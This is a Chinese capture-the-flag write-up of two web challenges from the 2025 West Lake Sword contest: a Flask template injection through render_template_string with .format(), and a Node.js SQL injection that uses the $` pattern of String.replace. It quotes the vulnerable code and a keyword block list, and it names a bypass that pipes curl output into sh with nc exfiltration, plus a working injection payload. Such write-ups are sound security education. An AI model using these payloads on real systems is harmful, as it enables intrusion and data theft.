---
title: 赛题记录 | 2025西湖论剑两道WEB的一些思考
contest: 2025 西湖论剑
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [Flask-SSTI, render_template_string, format-string, JSON.parse, URL-encoding, js-replace, lastMatch, sqli, String-replace-attack]
attack_chain:
- 例题1 Flask SSTI: render_template_string + format(phone)拼接用户输入phone触发SSTI
- 关键词过滤:flag/?/*/-/less/nl/tac/more/tail/od/grep/awd/sed/64//%2f/%2F
- 绕:使用curl目标机器|sh执行命令(也可通过print与进制绕)
- nc回传命令逐点执行
- 例题2 Nodejs SQL注入: 双重关卡
  1. URI中不允许逗号 → URL编码绕过
  2. 用户名/密码过滤'|"/\ → 真正的考题
- 关键:String.replace的lastMatch特性$` (待替换字符前所有字符)
- 构造:$` or 1# 作为username,触发SELECT * FROM userinfo WHERE username='` or 1#' and password='aa'
- $` 被替换为待替换字符前的所有字符,or 1#逃逸出单引号外
key_payload: $` or 1# (String.replace lastMatch特性)
one_liner: 2025西湖论剑两道WEB,Flask SSTI双层关键词过滤绕(curl|sh/nc)+Nodejs SQL注入String.replace lastMatch($` or 1#)逃逸单引号外。
lesson: Flask render_template_string配合format()是危险的;Nodejs String.replace的$` $' lastMatch特性常被忽视,可绕SQL注入字符过滤;URL编码是绕URI字符限制的通用方法。
quality: high
---

## 题目列表

2025西湖论剑2道WEB:
1. Flask SSTI (render_template_string)
2. Nodejs SQL注入 (String.replace特性)

## 关键考点

### 例题1: Flask SSTI
```python
@app.route("/cpass", methods=["POST"])
def check():
    global phone
    password = request.form.get("password")
    if is_safe_input(phone):
        return redirect(url_for('index'))
    if phone != "1686682318" and password != "Happy_news_admin":
        return render_template_string(
            '<!DOCTYPE html>...<script>alert("{}The number does not exist or the password is incorrect!")</script>...'.format(phone)
        )
```

#### 关键漏洞
- `render_template_string` + `.format(phone)` 拼接用户输入
- 触发SSTI
- 关键词过滤:`['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']`

#### 绕过滤
- 简单方案:`curl 目标机器 | sh`
- 也可通过print与进制绕
- nc回传命令逐点执行

### 例题2: Nodejs SQL注入

```javascript
router.get('/', (req, res, next) => {
    if(req.query.info){
        if(req.url.match(/,/ig)){
            res.end('hacker1!');
        }
        var info = JSON.parse(req.query.info);
        if(info.username && info.password){
            var username = info.username;
            var password = info.password;
            if(info.username.match(/'|"|\/) || info.password.match(/'|"|\/)){
                res.end('hacker2!');
            }
            var sql = "select * from userinfo where username = '{username}' and password = '{password}'";
            sql = sql.replace("{username}", username);
            sql = sql.replace("{password}", password);
            connection.query(sql, function (err, rs) {...});
        }
    }
});
```

#### 两层关卡
1. URI中不允许逗号 → URL编码绕过
2. 用户名/密码过滤'"/→核心考点

#### 关键洞察:String.replace lastMatch
- JavaScript String.replace特殊字符:
  - `$``: 待替换字符前所有字符
  - `$'`: 待替换字符后所有字符
  - `$&`: 整个匹配
  - `$1`...`$9`: 捕获组
- 构造:`username = '$` or 1#'`
- 替换后:SELECT * FROM userinfo WHERE username='...$` or 1#' AND ...
- $` 替换为"待替换字符前的所有字符"=整个字符串前半部分
- `or 1#` 逃逸出单引号外

#### 验证
```javascript
var str = "Hello, my name is Heihu577.";
var regex = /my name/;
var result = str.replace(regex, "A $` B");
console.log(result);
// "Hello, A Hello,  B is Heihu577."
```

## 实战价值
- Flask `render_template_string` + `.format()` 组合是危险的SSTI向量
- Nodejs `String.replace` 的 `$` ` $` ` $&` ` $1`...特性常被忽视
- URL编码是绕URI字符限制的通用方法
- nc+curl+sh是Linux命令回传的经典组合
